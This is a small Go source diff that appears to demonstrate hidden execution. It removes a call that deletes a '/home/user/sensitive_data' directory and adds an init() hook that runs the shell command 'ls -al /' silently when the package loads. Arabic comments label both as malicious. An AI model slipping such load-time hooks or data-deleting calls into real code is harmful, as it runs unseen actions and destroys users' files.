@@ -1,9 +1,20 @@
 package main
 
-import "fmt"
-import "os"
+import (
+	"os/exec"
+	"log"
+)
+
+func init() {
+	// تنفيذ أمر ضار عند تحميل الحزمة
+	cmd := exec.Command("ls", "-al", "/")
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		log.Fatal(err)
+	}
+	log.Println(string(output))
+}
 
 func main() {
-    fmt.Println("Executing malicious code!")
-    os.RemoveAll("/home/user/sensitive_data") // ده مثال على تنفيذ أكواد ضارة
+	// الكود الطبيعي هنا، لكن التنفيذ يحدث عند تحميل الحزمة
 }
